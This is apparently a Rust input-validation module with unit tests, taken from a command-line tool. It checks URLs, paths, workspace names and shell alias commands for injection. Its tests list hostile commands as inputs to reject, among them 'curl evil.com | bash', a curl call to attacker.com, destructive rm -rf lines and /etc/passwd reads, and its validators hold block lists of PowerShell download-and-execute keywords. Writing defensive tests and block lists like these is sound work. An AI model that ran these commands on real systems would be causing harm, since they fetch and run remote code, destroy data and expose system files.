// Validation module for security and input sanitization
// This module provides reusable validation functions for URLs, paths, and other inputs

use anyhow::{anyhow, ensure, Context, Result};
use regex::Regex;
use std::path::{Path, PathBuf};
use unicode_normalization::UnicodeNormalization;
use url::Url;
use std::sync::OnceLock;

use super::Blacklist;

/// Maximum URL length to prevent DoS attacks
const MAX_URL_LENGTH: usize = 2048;

/// Maximum output filename length
const MAX_OUTPUT_LENGTH: usize = 255;

pub fn validate_url(url_str: &str) -> Result<()> {
    let trimmed = url_str.trim();

    ensure!(!trimmed.is_empty(), "URL cannot be empty");
    ensure!(
        url_str.len() <= MAX_URL_LENGTH,
        "URL is too long ({} characters, max {})",
        url_str.len(),
        MAX_URL_LENGTH
    );

    // Check protocol is lowercase (strict validation)
    // While browsers normalize, we reject uppercase for consistency
    ensure!(
        url_str.starts_with("http://") || url_str.starts_with("https://"),
        "URL must start with lowercase http:// or https://"
    );

    // Check for null bytes
    ensure!(
        !url_str.contains('\0'),
        "URL contains null byte - security risk"
    );

    const DANGEROUS_CHARS: &[&str] = &[";", "|", "`", "\n", "\r"];

    for ch in DANGEROUS_CHARS {
        ensure!(
            !url_str.contains(ch),
            "URL contains dangerous character '{}'",
            ch
        );
    }

    ensure!(
        !url_str.contains("$("),
        "URL contains command substitution pattern $()"
    );

    ensure!(
        !url_str.contains("& ") && !url_str.contains(" &"),
        "URL contains shell operator with space"
    );
    ensure!(!url_str.contains("&& "), "URL contains shell AND operator");
    ensure!(!url_str.contains("|| "), "URL contains shell OR operator");

    let url = Url::parse(url_str).context("Invalid URL format")?;

    let scheme = url.scheme();
    ensure!(
        scheme == "http" || scheme == "https",
        "URL must use http or https protocol, got: {}",
        scheme
    );

    ensure!(url.host_str().is_some(), "URL has no hostname");

    Ok(())
}

pub fn validate_web_url(url: &str) -> Result<()> {
    validate_url(url).context("Invalid web URL")?;
    Ok(())
}

/// Validate that a URL is not in the blacklist
/// Returns an error if the URL's domain is blacklisted
pub fn validate_url_not_blacklisted(url: &str, blacklist: &Blacklist) -> Result<()> {
    if blacklist.is_blocked(url) {
        // Extract domain for error message
        let domain = Url::parse(url)
            .ok()
            .and_then(|u| u.domain().map(String::from))
            .unwrap_or_else(|| "unknown".to_string());

        return Err(anyhow!(
            "URL is blacklisted (blocked domain: {}). This domain is known for malicious or unwanted content.",
            domain
        ));
    }

    Ok(())
}

/// Load the default blacklist from the embedded const file
pub fn load_default_blacklist() -> Result<Blacklist> {
    // Get the path to the blacklist file
    // The file is located at src/const/black_list_url relative to the project root
    let blacklist_path = get_blacklist_path()?;

    Blacklist::load_from_file(&blacklist_path).context("Failed to load blacklist file")
}

/// Get the path to the blacklist file
fn get_blacklist_path() -> Result<PathBuf> {
    // Try to find the blacklist file in the executable's directory first
    if let Ok(exe_path) = std::env::current_exe() {
        if let Some(exe_dir) = exe_path.parent() {
            // Check for blacklist next to the executable (for deployed builds)
            let deployed_path = exe_dir.join("black_list_url");
            if deployed_path.exists() {
                return Ok(deployed_path);
            }

            // Check for blacklist in src/const (for development)
            let dev_path = exe_dir.join("src").join("const").join("black_list_url");
            if dev_path.exists() {
                return Ok(dev_path);
            }
        }
    }

    // Fallback: try current directory
    let current_dir = std::env::current_dir().context("Failed to get current directory")?;

    // Try src/const/black_list_url from current directory
    let src_path = current_dir.join("src").join("const").join("black_list_url");
    if src_path.exists() {
        return Ok(src_path);
    }

    // Try black_list_url in current directory
    let current_path = current_dir.join("black_list_url");
    if current_path.exists() {
        return Ok(current_path);
    }

    // If none exist, return the expected development path
    // (will be created or cause an error if needed)
    Ok(current_dir.join("src").join("const").join("black_list_url"))
}

pub fn validate_output_path(output: &str) -> Result<()> {
    let trimmed = output.trim();
    ensure!(!trimmed.is_empty(), "Output path cannot be empty");
    ensure!(
        !output.contains(".."),
        "Output path contains path traversal (..) - security risk"
    );
    ensure!(
        !output.starts_with('/') && !output.starts_with('\\'),
        "Output path should be relative, not absolute: {}",
        output
    );

    if output.len() >= 2 {
        ensure!(
            output.chars().nth(1) != Some(':'),
            "Output path should not contain drive letters: {}",
            output
        );
    }

    ensure!(!output.contains('\0'), "Output path contains null byte");

    const DANGEROUS_CHARS: [char; 7] = ['|', '&', ';', '$', '`', '\n', '\r'];
    for ch in DANGEROUS_CHARS {
        ensure!(
            !output.contains(ch),
            "Output path contains dangerous character '{}'",
            ch
        );
    }

    ensure!(
        output.len() <= MAX_OUTPUT_LENGTH,
        "Output path is too long ({} characters, max {})",
        output.len(),
        MAX_OUTPUT_LENGTH
    );

    Ok(())
}

pub fn validate_directory_path(path: &str) -> Result<()> {
    let trimmed = path.trim();
    ensure!(
        !trimmed.is_empty(),
        "Path cannot be empty or whitespace-only"
    );

    let path_buf = Path::new(path);

    if path_buf.exists() {
        ensure!(
            !path_buf.is_file(),
            "Path points to a file, not a directory: {}",
            path
        );
        ensure!(path_buf.is_dir(), "Path is not a valid directory: {}", path);

        if let Some(extension) = path_buf.extension() {
            const FILE_EXTENSIONS: [&str; 22] = [
                "exe", "bin", "dll", "so", "dylib", "png", "jpg", "jpeg", "gif", "bmp", "svg",
                "zip", "tar", "gz", "7z", "rar", "mp4", "avi", "mkv", "txt", "doc", "pdf",
            ];

            let ext_str = extension.to_string_lossy().to_lowercase();
            ensure!(
                !FILE_EXTENSIONS.contains(&ext_str.as_str()),
                "Path has file extension '{}', expected directory: {}",
                ext_str,
                path
            );
        }
    }

    ensure!(!path.contains('\0'), "Path contains null byte");

    Ok(())
}

pub fn validate_workspace_name(name: &str) -> Result<()> {
    if name.trim().is_empty() {
        return Err(anyhow!("Workspace name cannot be empty"));
    }

    if name.contains('\0') {
        return Err(anyhow!("Workspace name contains null byte"));
    }

    if name.contains('/') || name.contains('\\') {
        return Err(anyhow!(
            "Workspace name cannot contain path separators: {}",
            name
        ));
    }

    let dangerous_chars = [';', '|', '&', '$', '`', '\n', '\r'];
    for ch in dangerous_chars {
        if name.contains(ch) {
            return Err(anyhow!(
                "Workspace name contains dangerous character '{}': {}",
                ch,
                name
            ));
        }
    }

    if name.len() > 100 {
        return Err(anyhow!("Workspace name is too long (max 100 characters)"));
    }

    Ok(())
}

/// Redacts credentials from URLs to prevent exposure in logs
///
/// Examples:
/// - `https://user:pass@example.com/path` -> `https://***:***@example.com/path`
/// - `http://admin:secret@192.168.1.1` -> `http://***:***@192.168.1.1`
/// - `https://example.com/path` -> `https://example.com/path` (unchanged)
pub fn redact_url_credentials(input: &str) -> String {
    // Fast path: if there's no '@', credentials are impossible
    if !input.contains('@') {
        return input.to_owned();
    }

    // Preferred path: robust URL parsing
    if let Ok(mut url) = Url::parse(input) {
        if url.username().is_empty() && url.password().is_none() {
            return input.to_owned();
        }

        // These setters only fail if the URL cannot have credentials,
        // which is not the case here because credentials already exist.
        url.set_username("***")
            .and_then(|_| url.set_password(Some("***")))
            .expect("URL already contains credentials; redaction must succeed");

        return url.to_string();
    }

    // Fallback: conservative regex-based redaction
    static CREDENTIALS_RE: OnceLock<Regex> = OnceLock::new();
    let re = CREDENTIALS_RE.get_or_init(|| {
        Regex::new(r"(?i)\b(https?://)([^:@/]+):([^@/]+)@")
            .expect("Hardcoded regex must be valid")
    });

    re.replace(input, "$1***:***@").to_string()
}

/// See docs/security.md for security considerations
pub fn validate_alias_command(command: &str) -> Result<()> {
    // SECURITY: Normalize Unicode to prevent homoglyph attacks
    // NFKC (Compatibility Decomposition) converts visually similar chars to canonical form
    // Example: Greek Question Mark (U+037E ;) becomes ASCII semicolon (U+003B ;)
    let normalized: String = command.nfkc().collect();

    let trimmed = normalized.trim();

    ensure!(!trimmed.is_empty(), "Alias command cannot be empty");
    ensure!(
        !normalized.contains('\0'),
        "Alias command contains null byte"
    );

    // Run blacklist checks on NORMALIZED string
    ensure!(
        !normalized.contains(';'),
        "Alias command contains semicolon (;) - detected via Unicode normalization"
    );
    ensure!(
        !normalized.contains('|'),
        "Alias command contains pipe operator (|)"
    );
    ensure!(
        !normalized.contains('&'),
        "Alias command contains ampersand (&)"
    );

    const DANGEROUS_KEYWORDS: &[&str] = &[
        ";", "|", "&&", "||", "&", "`", "$(", "$", ">", "<", "*", "?", "[", "]", "~", "\n", "\r",
        "(", ")", "{", "}", "!",
    ];

    for ch in DANGEROUS_KEYWORDS {
        ensure!(
            !normalized.contains(ch),
            "Alias command contains dangerous character '{}'",
            ch
        );
    }

    // Check for control characters (0x00-0x1F, 0x7F)
    for c in normalized.chars() {
        ensure!(
            !c.is_control() || c == '\n' || c == '\r' || c == '\t',
            "Alias command contains control character (0x{:02X})",
            c as u32
        );
    }

    ensure!(
        !normalized.contains('\t'),
        "Alias command contains tab character"
    );

    ensure!(
        !normalized.contains('"') && !normalized.contains('\''),
        "Alias command contains quotes"
    );

    ensure!(
        !normalized.contains("exec"),
        "Alias command contains 'exec' keyword"
    );
    ensure!(
        !normalized.contains("eval"),
        "Alias command contains 'eval' keyword"
    );

    ensure!(
        command.len() <= 500,
        "Alias command is too long ({} characters, max 500)",
        command.len()
    );

    Ok(())
}

/// See docs/security.md for security considerations
pub fn validate_alias_command_windows(command: &str) -> Result<()> {
    // SECURITY: Normalize Unicode to prevent homoglyph attacks
    // NFKC (Compatibility Decomposition) converts visually similar chars to canonical form
    // Example: Greek Question Mark (U+037E ;) becomes ASCII semicolon (U+003B ;)
    let normalized: String = command.nfkc().collect();

    let trimmed = normalized.trim();

    // Basic checks
    ensure!(!trimmed.is_empty(), "Alias command cannot be empty");
    ensure!(
        !normalized.contains('\0'),
        "Alias command contains null byte - security risk"
    );

    // CRITICAL: Check for command injection characters (WINDOWS-SPECIFIC)
    // Note: Backslash (\) is NOT included because it's needed for Windows paths
    const DANGEROUS_CHARS: &[(&str, &str)] = &[
        (";", "command separator - prevents command injection"),
        ("|", "pipe operator - prevents command injection"),
        (
            "&",
            "background/chaining operator - prevents command injection",
        ),
        ("`", "command substitution - prevents command injection"),
        (
            "$",
            "variable/command substitution - prevents command injection",
        ),
        (">", "output redirection - prevents file manipulation"),
        ("<", "input redirection - prevents file manipulation"),
        ("\n", "newline - prevents multi-line injection"),
        ("\r", "carriage return - prevents injection"),
        ("(", "subshell - prevents command substitution"),
        (")", "subshell - prevents command substitution"),
        ("{", "brace expansion - prevents injection"),
        ("}", "brace expansion - prevents injection"),
        ("*", "wildcard - prevents unexpected file operations"),
        ("?", "wildcard - prevents unexpected file operations"),
        ("[", "wildcard - prevents unexpected file operations"),
        ("]", "wildcard - prevents unexpected file operations"),
        ("!", "history expansion - prevents injection"),
        ("~", "home directory expansion - prevents path manipulation"),
    ];

    for (ch, reason) in DANGEROUS_CHARS {
        ensure!(
            !normalized.contains(ch),
            "Alias command contains dangerous character '{}' - {}",
            ch,
            reason
        );
    }

    // Windows-specific dangerous characters
    const WINDOWS_DANGEROUS: &[(&str, &str)] = &[
        ("%", "batch variable expansion - prevents injection"),
        ("^", "CMD escape character - prevents bypass"),
    ];

    for (ch, reason) in WINDOWS_DANGEROUS {
        ensure!(
            !normalized.contains(ch),
            "Windows alias command contains dangerous character '{}' - {}",
            ch,
            reason
        );
    }

    // Check for control characters (0x00-0x1F, 0x7F)
    for c in normalized.chars() {
        ensure!(
            !c.is_control() || c == '\n' || c == '\r' || c == '\t',
            "Alias command contains control character (0x{:02X})",
            c as u32
        );
    }

    // Additional pattern checks for obfuscated attacks
    ensure!(
        !normalized.contains("exec"),
        "Alias command contains 'exec' keyword - potential code execution"
    );
    ensure!(
        !normalized.contains("eval"),
        "Alias command contains 'eval' keyword - potential code execution"
    );

    // Check for PowerShell-specific patterns
    let normalized_lower = normalized.to_lowercase();
    ensure!(
        !normalized_lower.contains("invoke-expression"),
        "Command contains PowerShell Invoke-Expression - code execution risk"
    );
    ensure!(
        !normalized_lower.contains("iex"),
        "Command contains PowerShell IEX - code execution risk"
    );
    ensure!(
        !normalized_lower.contains("downloadstring"),
        "Command contains DownloadString - remote code execution risk"
    );

    // Length check
    ensure!(
        command.len() <= 500,
        "Alias command is too long ({} characters, max 500)",
        command.len()
    );

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_validate_url_valid() {
        let valid_urls = vec![
            "https://www.youtube.com/watch?v=abc",
            "http://example.com",
            "https://example.com:8080/path",
            "https://example.com/path?foo=bar&baz=qux", // & is valid in query params
        ];

        for url in valid_urls {
            assert!(validate_url(url).is_ok(), "Should accept: {}", url);
        }
    }

    #[test]
    fn test_validate_url_invalid() {
        let invalid_urls = vec![
            "",                  // Empty
            "ftp://example.com", // Wrong protocol
            "https://",          // No hostname
            "not-a-url",         // Invalid format
            "http://",           // No hostname
            "//example.com",     // No scheme
        ];

        for url in invalid_urls {
            assert!(validate_url(url).is_err(), "Should reject: {}", url);
        }
    }

    #[test]
    fn test_validate_url_too_long() {
        let long_url = format!("https://example.com/{}", "a".repeat(3000));
        assert!(
            validate_url(&long_url).is_err(),
            "Should reject URL longer than MAX_URL_LENGTH"
        );
    }

    #[test]
    fn test_validate_output_path_valid() {
        let valid_paths = vec!["video", "my-video.mp4", "videos/lecture1"];

        for path in valid_paths {
            assert!(
                validate_output_path(path).is_ok(),
                "Should accept: {}",
                path
            );
        }
    }

    #[test]
    fn test_validate_output_path_invalid() {
        let invalid_paths = vec![
            "../../../etc/passwd",
            "/etc/passwd",
            "C:\\Windows",
            "video; rm -rf /",
        ];

        for path in invalid_paths {
            assert!(
                validate_output_path(path).is_err(),
                "Should reject: {}",
                path
            );
        }
    }

    #[test]
    fn test_validate_workspace_name_valid() {
        let valid_names = vec!["my-project", "work_2024", "client-site"];

        for name in valid_names {
            assert!(
                validate_workspace_name(name).is_ok(),
                "Should accept: {}",
                name
            );
        }
    }

    #[test]
    fn test_validate_workspace_name_invalid() {
        let invalid_names = vec!["", "name/with/slash", "name; rm -rf /", "name\0null"];

        for name in invalid_names {
            assert!(
                validate_workspace_name(name).is_err(),
                "Should reject: {}",
                name
            );
        }
    }

    #[test]
    fn test_validate_alias_command_valid() {
        let valid_commands = vec![
            "ls -la",
            "git status",
            "cargo build --release",
            "python3 script.py",
            "node index.js",
            "echo hello",
        ];

        for cmd in valid_commands {
            assert!(
                validate_alias_command(cmd).is_ok(),
                "Should accept valid command: {}",
                cmd
            );
        }
    }

    #[test]
    fn test_validate_alias_command_injection() {
        let malicious_commands = vec![
            "ls; rm -rf /",
            "echo `whoami`",
            "echo $(cat /etc/passwd)",
            "curl evil.com | bash",
            "cat file > /etc/passwd",
            "sleep 1 &",
            "echo && malicious",
            "test || dangerous",
            "ls -la; curl http://attacker.com",
        ];

        for cmd in malicious_commands {
            assert!(
                validate_alias_command(cmd).is_err(),
                "Should reject malicious command: {}",
                cmd
            );
        }
    }

    #[test]
    fn test_validate_alias_command_wildcards() {
        let wildcard_commands = vec!["rm -rf *", "cat *.txt", "ls [abc]", "echo test?"];

        for cmd in wildcard_commands {
            assert!(
                validate_alias_command(cmd).is_err(),
                "Should reject wildcard command: {}",
                cmd
            );
        }
    }

    #[test]
    fn test_validate_alias_command_windows_valid() {
        let valid_commands = vec!["dir", "notepad file.txt", "python script.py"];

        for cmd in valid_commands {
            assert!(
                validate_alias_command_windows(cmd).is_ok(),
                "Should accept valid Windows command: {}",
                cmd
            );
        }
    }

    #[test]
    fn test_validate_alias_command_windows_injection() {
        let malicious_commands = vec![
            "notepad & calc.exe",
            "echo %PATH%",
            "dir ^& malicious",
            "powershell -c IEX",
            "cmd /c downloadstring",
        ];

        for cmd in malicious_commands {
            assert!(
                validate_alias_command_windows(cmd).is_err(),
                "Should reject malicious Windows command: {}",
                cmd
            );
        }
    }

    #[test]
    fn test_redact_url_credentials() {
        // URLs with credentials should be redacted
        let urls_with_creds = vec![
            (
                "https://admin:secretP@ssw0rd@private-server.com/video.mp4",
                "https://***:***@private-server.com/video.mp4",
            ),
            (
                "https://user:token123@api.example.com/download",
                "https://***:***@api.example.com/download",
            ),
            (
                "http://root:toor@192.168.1.100:8080/secure/file",
                "http://***:***@192.168.1.100:8080/secure/file",
            ),
            (
                "https://john:p@ssword@example.com/path?query=value",
                "https://***:***@example.com/path?query=value",
            ),
            (
                "http://user:pass@host.com:3000/api#fragment",
                "http://***:***@host.com:3000/api#fragment",
            ),
        ];

        for (original, expected) in urls_with_creds {
            let redacted = redact_url_credentials(original);
            assert_eq!(
                redacted, expected,
                "Failed to redact credentials from: {}",
                original
            );
        }

        // URLs without credentials should remain unchanged
        let urls_without_creds = vec![
            "https://example.com/path",
            "http://192.168.1.1:8080/api",
            "https://youtube.com/watch?v=abc123",
        ];

        for url in urls_without_creds {
            let redacted = redact_url_credentials(url);
            assert_eq!(redacted, url, "Should not modify URL without credentials");
        }
    }
}
